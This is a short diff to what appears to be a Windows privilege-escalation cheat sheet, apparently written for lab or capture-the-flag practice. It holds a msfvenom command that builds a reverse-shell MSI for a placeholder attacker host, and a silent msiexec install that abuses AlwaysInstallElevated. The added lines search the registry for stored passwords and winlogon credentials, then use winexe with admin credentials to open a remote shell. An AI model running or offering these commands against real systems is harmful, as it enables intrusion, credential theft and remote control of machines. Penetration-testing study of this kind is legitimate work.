@@ -194,6 +194,11 @@ AlwaysInstallElevated:
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=53 -f msi -o reverse.msi`  
 `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`  
 
+Registry Search:
+`reg query HKLM /f password /t REG_SZ /s`
+`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
+On Kali:
+winexe -U 'admin%password' //10.10.125.210 cmd.exe
 
 
 ### RCE
